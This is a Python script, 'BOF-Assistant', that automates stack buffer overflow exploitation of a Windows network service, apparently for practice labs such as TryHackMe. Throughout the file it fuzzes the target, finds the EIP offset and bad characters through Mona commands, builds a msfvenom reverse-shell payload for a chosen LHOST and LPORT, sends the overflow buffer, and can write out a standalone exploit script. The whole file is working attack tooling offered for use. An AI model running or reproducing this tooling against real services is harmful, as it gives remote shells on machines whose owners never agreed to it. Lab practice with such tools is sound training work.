#!/usr/bin/env python3
import socket, time, sys, os

import pyperclip

#Terminal color defined
RED = "\033[0;31m"
GREEN = "\033[0;32m"
BLUE = "\033[0;34m"
END = "\033[0m"

#Headings for each section
H_fuzz="""
 _____             _         
|   __|_ _ ___ ___|_|___ ___ 
|   __| | |- _|- _| |   | . |
|__|  |___|___|___|_|_|_|_  |
                        |___|"""
H_EIP="""                                         
 _____         _           _ _ _            _____ _____ _____ 
|     |___ ___| |_ ___ ___| | |_|___ ___   |   __|     |  _  |
|   --| . |   |  _|  _| . | | | |   | . |  |   __|-   -|   __|
|_____|___|_|_|_| |_| |___|_|_|_|_|_|_  |  |_____|_____|__|   
                                    |___|                     
"""
H_BadCh="""                                                                               
 _____ _       _ _            _____       _    _____ _                   _               
|   __|_|___ _| |_|___ ___   | __  |___ _| |  |     | |_ ___ ___ ___ ___| |_ ___ ___ ___ 
|   __| |   | . | |   | . |  | __ -| .'| . |  |   --|   | .'|  _| .'|  _|  _| -_|  _|_ -|
|__|  |_|_|_|___|_|_|_|_  |  |_____|__,|___|  |_____|_|_|__,|_| |__,|___|_| |___|_| |___|
                      |___|                                                              """
H_JumpPt="""
 _____ _       _ _                      __                  _____     _     _   
|   __|_|___ _| |_|___ ___    ___    __|  |_ _ _____ ___   |  _  |___|_|___| |_ 
|   __| |   | . | |   | . |  | .'|  |  |  | | |     | . |  |   __| . | |   |  _|
|__|  |_|_|_|___|_|_|_|_  |  |__,|  |_____|___|_|_|_|  _|  |__|  |___|_|_|_|_|  
                      |___|                         |_|                         """
H_exploitatoin="""
                                             
 _____         _     _ _       _   _         
|   __|_ _ ___| |___|_| |_ ___| |_|_|___ ___ 
|   __|_'_| . | | . | |  _| .'|  _| | . |   |
|_____|_,_|  _|_|___|_|_| |__,|_| |_|___|_|_|
          |_|                                """

def intro():
    print(BLUE)
    print("""
______  ___________         ___          _     _              _   
| ___ \|  _  |  ___|       / _ \        (_)   | |            | |  
| |_/ /| | | | |_ ______  / /_\ \___ ___ _ ___| |_ __ _ _ __ | |_ 
| ___ \| | | |  _|______| |  _  / __/ __| / __| __/ _` | '_ \| __|
| |_/ /\ \_/ / |          | | | \__ \__ \ \__ \ || (_| | | | | |_ 
\____/  \___/\_|          \_| |_/___/___/_|___/\__\__,_|_| |_|\__|
                                                                  
                                                                  """)
    print(GREEN,"My Name is Bofy makes BOF(Buffer-Overflow) Easy made by PakCyberbot")
    print("You can follow Pakcyberbot on his social media platforms for more informative materials.\nAll SocialMedia links can be found here:",RED,"https://tryhackme.com/p/PakCyberbot",END)
    
    print('\n\nNOTE: You can also modify the exploit(), direct_exploit(), generate_exploit_file() and fuzzer() packet sending block according to your Target Program Input Behaviour')

    print("\n\nLet's start doing Buffer-Overflow. \nStart your Vulnerable application on other machine in the Immunity Debugger and also setup Mona in it.")
    input("(Press Enter to Continue)\n")
    print("Type the following command in the immunity debugger command to setup the working directory for Mona:\n")
    command = "!mona config -set workingfolder c:\\mona\\%p"
    print(GREEN,command,END)
    pyperclip.copy(command)
    print("I have copied the command in your clipboard too!")
    input("(Press Enter to Continue)\n")
    print(H_fuzz)
    print("\nNow Let me do some rough fuzzing to check where the stack overflow error occurs in the program")


def fuzzer():
    global prefix
    global string
    global padding
    padding =""
    prefix = input(BLUE+"If there is any prefix with the input then type it else Leave empty : "+END)
    print("OK, now wait for me to respond back to you. After fuzzing")
    timeout = 5

    string = prefix + "A" * 100

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip, port))

                # You can modify this block according to your Target Program Input Behaviour
                s.recv(1024)
                print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
                s.send(bytes(string, "latin-1"))
                s.recv(1024)
        except:
            print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
            break
        string += 100 * "A"
        time.sleep(1)
    print("\nI found the rough offset of ", len(string) - len(prefix) ," bytes and I hope your vulnerable application got crashed in the immunity\n")
    print(RED, "Just restart your application in Immunity debugger and we are going further!", END)
    input("(Press Enter to Continue)\n")


    print(H_EIP)
    
    print('\nOk, Now I am using your Metasploit to create a pattern payload. Wait for me to show my progress')
    print("I am using the following command to generate the pattern, I will also show the pattern to you")
    print("\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l ",str(len(string) - len(prefix)+200))
    print("I added 200 bytes for the safety")
    
    padding = os.popen("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l "+str(len(string) - len(prefix)+200)).read()
    print("\n", padding)
    print("\nI am going to send this generated payload to the application. I hope you restarted the application.")
    input("(Press Enter to Continue)\n")

def exploit():
    global padding
    offset = 0
    overflow = "A" * offset
    retn = ""
    payload = padding
    postfix = ""
    badchars =""
    padding=""
    for i in range(0,4):
        overflow = "A" * offset
        buffer = prefix + overflow + retn + padding + payload + postfix

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            s.connect((ip, port))

            # You can modify this block according to your Target Program Input Behaviour    
            print("Sending evil buffer...")
            s.send(bytes(buffer + "\r\n", "latin-1"))
            print("Done!")
        except:
            print("Could not connect.")
        
        #condition for each iterations 

        # To Find the offset to EIP
        if i == 0:
            print("Now I need your interaction to do some task.")
            print("Type the following command in the immunity debugger command to find the exact offset in order to get the EIP address\n")
            command = "!mona findmsp -distance "+str(len(string) - len(prefix) + 200)
            print(GREEN,command,END)
            pyperclip.copy(command)
            print("I have copied the command in your clipboard too!")
            print('\nMona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view).')
            print('In this output you should see a line which states:')
            print("EIP contains normal pattern : ... (offset XXXX)")
            
            offset = int(input(BLUE+"I helped you alot, Now please tell me the offset of EIP : "+END))
            payload =""
            retn ="BBBB"
            print(RED,"Ok, Now restart your application so that I can test your offset",END)
            input("(Press Enter to Continue)\n")
       
        if i == 1:
            print("I have sent the payload, Now please check the EIP register value. I hope the value is 42424242")
            value = input(BLUE+ "Am I right?(Y/n) : "+ END)
            if value.lower() == 'n':
                print("You lied me now or Lied me before, about offset!")
                sys.exit()
            print(RED+"Please restart the application, Now we are going to test for bad characters"+END)
            input("(Press Enter to Continue)\n")
            print(H_BadCh)
            # Finding Bad Chars
            print("\nType the following command in the immunity debugger command to find the exact offset in order to get the EIP address\n")
            command = '!mona bytearray -b "\\x00"'
            print(GREEN,command,END)
            pyperclip.copy(command)
            print("I have copied the command in your clipboard too!")
            input("(Press Enter to Continue)\n")

            #generating characters
            characters='\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
            payload = characters
        
        if i == 2:
            # Compare both byte array to identify bad chars
            print("Make a note of the address to which the ESP register points and use it in the following mona command:")
            command = '!mona compare -f C:\\mona\\<ProgramName>\\bytearray.bin -a <address>"'
            print(GREEN,command,END)
            pyperclip.copy("!mona compare -f C:\\mona\\ \\bytearray.bin -a ")
            print("I have copied the command in your clipboard too!")
            print('\nA popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.')
            print('Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.')
            badchars= input(BLUE+"Tell me the bad chars that you found(input: \\x00\\x07\\xe1) : "+END)
            badchars = '\\x00' if badchars == '' else badchars
            # Update this Code whenever free to test for badchars too
            print('Okay this time I trust you and I am not going to test these badchars')
            print(H_JumpPt)
            # Find the register
            print("\nrun the following mona command, making sure to update the -cpb option with all the badchars you identified(including \\x00)\n")
            command = f'!mona jmp -r esp -cpb "{badchars}"'
            print(GREEN,command,END)
            pyperclip.copy(command)
            print("I have copied the command in your clipboard too!")
            input("(Press Enter to Continue)\n")
            print("\nThe mona find command can similarly be used to find specific instructions, though for the most part, the jmp command is sufficient:\n")
            command = f'!mona find -s \'jmp esp\' -type instr -cm aslr=false,rebase=false,nx=false -cpb "{badchars}"'
            print(GREEN,command,END)
            pyperclip.copy(command)
            print("I have copied the command in your clipboard too!")
            print("This command finds all \"jmp esp\" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the \"Log data\" window (use the Window menu to switch to it if needed).")
            input("(Press Enter to Continue)\n")

            #esp register address
            retn = input(BLUE+"I hope you found the ESP register address(For example if the address is \\x01\\x02\\x03\\x04 in Immunity, write it as \\x04\\x03\\x02\\x01) : "+END)
            retn = retn.encode('utf-8').decode('unicode_escape')

            print(H_exploitatoin)
            print('\nOk, Now I am using your MsfVenom to generate a reverse shell payload.')
            LHOST = input(BLUE+'Give your LHOST= '+END)
            LPORT = input(BLUE+'Give your LPORT= '+END)
            print("I am using the following command to generate the pattern, I will also show the pattern to you")
            print(f"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\" -f c")
            print("\nMsfVenom payload takes sometime to generate till now you can start your netcat listener on another terminal")
            
            payload = os.popen(f"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\" -f c | grep -oe  '\"[\\\\0-9a-z]*\"' | tr -d '\"' | tr -d \"\\n\"").read()
            print("\n", payload)
            payload = (payload.encode('utf-8').decode('unicode_escape'))

            print(RED, 'Now Restart your application for last time.', END)
            padding = "\x90" * 16
            input("(Press Enter to Continue)\n\n")
        # Ending message
        if i == 3:
            print('Wait for few seconds to get reverse shell!')
            print('If you like that program then don\'t forget to show your support to PakCyberbot. It motivates him to work more for the community')
            print("""
   ____     ____             ___       __            __           __        __    
  / __/__  / / /__ _    __  / _ \___ _/ /________ __/ /  ___ ____/ /  ___  / /_   
 / _// _ \/ / / _ \ |/|/ / / ___/ _ `/  '_/ __/ // / _ \/ -_) __/ _ \/ _ \/ __/   
/_/  \___/_/_/\___/__,__/ /_/   \_,_/_/\_\\__/\_, /_.__/\__/_/ /_.__/\___/\__/    
                                             /___/                    
                                                         
            """)
            print()
            file_generate =input(BLUE+'Do you want to generate EXPLOIT file (Y/n) : ' + END)
            if file_generate.lower() == 'n':
                print('python3 BOF-Assistant.py <IP> <PORT> [-e/--exploit]')
                print('\n-e/--exploit : to directly exploit the program if you know the values')
            else:
                generate_exploit_file(buffer, LPORT)
            input(RED+"(Press Enter to Continue)\n"+END)
            sys.exit()

# You can directly exploit the application if you know the values already.

def direct_exploit():
    
    print(H_exploitatoin)

    # Direct Value assignment    
    prefix = input(BLUE+"Prefix (if Any else Leave blank): "+END)
    offset = int(input(BLUE+"Offset of EIP : "+END))
    badchars= input(BLUE+"Bad Chars (input: \\x00\\x07\\xe1) : "+END)
    badchars = '\\x00' if badchars == '' else badchars
    
    retn = input(BLUE+"ESP register address(For example if the address is \\x01\\x02\\x03\\x04 in Immunity, write it as \\x04\\x03\\x02\\x01) : "+END)
    retn = retn.encode('utf-8').decode('unicode_escape')
    
    print('\nOk, Now I am using your MsfVenom to generate a reverse shell payload.')
    LHOST = input(BLUE+'Give your LHOST= '+END)
    LPORT = input(BLUE+'Give your LPORT= '+END)
    print("I am using the following command to generate the pattern, I will also show the pattern to you")
    print(f"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\" -f c")
    print("\nMsfVenom payload takes sometime to generate till now you can start your netcat listener on another terminal")
    
    payload = os.popen(f"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\" -f c | grep -oe  '\"[\\\\0-9a-z]*\"' | tr -d '\"' | tr -d \"\\n\"").read()
    
    payload = (payload.encode('utf-8').decode('unicode_escape'))
    padding = "\x90" * 16
    overflow = "A" * offset
    buffer = prefix + overflow + retn + padding + payload

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    file_generate =input(BLUE+'Do you want to generate EXPLOIT file (y/N) : ' + END)
    if file_generate.lower() == 'y':
        generate_exploit_file(buffer, LPORT)
    else:
        print('python3 BOF-Assistant.py <IP> <PORT> [-e/--exploit]')
        print('\n-e/--exploit : to directly exploit the program if you know the values')

    try:
        s.connect((ip, port))
        print("Sending evil buffer...")
        # You can modify this block according to your Target Program Input Behaviour    
        s.send(bytes(buffer + "\r\n", "latin-1"))
        s.close()
        print("Done!")
    except Exception as e:
        print(e)
        print("Could not connect.")

def generate_exploit_file(exploit_payload, LPORT):
    exploit_payload = exploit_payload.replace('\\','\\\\')
    exp_fileName = input(BLUE+ "Give the FileName for your Exploit file (DefaultName = Bofy-Exploit) : " + END)
    exp_fileName = "Bofy-Exploit" if exp_fileName == '' else exp_fileName
    with open(exp_fileName+'.py', 'w') as f:
        f.write(f"""
import sys,socket

if len(sys.argv) == 3:
    buffer = {exploit_payload.encode('latin-1')}
    buffer = buffer.decode('unicode_escape')
    try:
        ip = sys.argv[1]
        port = int(sys.argv[2])
        print('Start the listener at PORT : '+ str({LPORT}))
        input('(Press Enter to Continue)')
        #Just to check connection
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            print("Sending evil buffer...")
            
            # You can modify this block according to your Target Program Input Behaviour    
            s.send(bytes(buffer + "\\r\\n", "latin-1"))
            s.close()
            print("Done!")

    except Exception as e:
        print(e)
        print("Connection didn't Established!")
        sys.exit(0)
else:
    print(f'python3 \x7bsys.argv[0]\x7d <IP> <PORT>')
        """)
    print(f'I have generated file {exp_fileName}.py for you.\n Simply type python3 {exp_fileName}.py <TargetIP> <TargetPort> to exploit it')


if __name__ == "__main__":
    global ip
    global port
    if len(sys.argv) == 3:
        
        try:
             
            ip = sys.argv[1]
            port = int(sys.argv[2])
            
            # Just to check connection
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip, port))

        except:
            print("Connection didn't Established!")
            sys.exit(0)
        
        intro()
        fuzzer()        
        exploit()
    if len(sys.argv) > 3:
        if sys.argv[3].lower() == '--exploit' or sys.argv[3].lower() == '-e':
            try:
                ip = sys.argv[1]
                port = int(sys.argv[2])
                
                # Just to check connection
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((ip, port))

            except:
                print("Connection didn't Established!")
                sys.exit(0)
            direct_exploit()
    else:
        print('python3 BOF-Assistant.py <IP> <PORT> [-e/--exploit]')
        print('\n-e/--exploit : to directly exploit the program if you know the values')
        print('\n\n NOTE: You can also modify the exploit(), direct_exploit(), generate_exploit_file() and fuzzer() packet sending block according to your Target Program Input Behaviour')
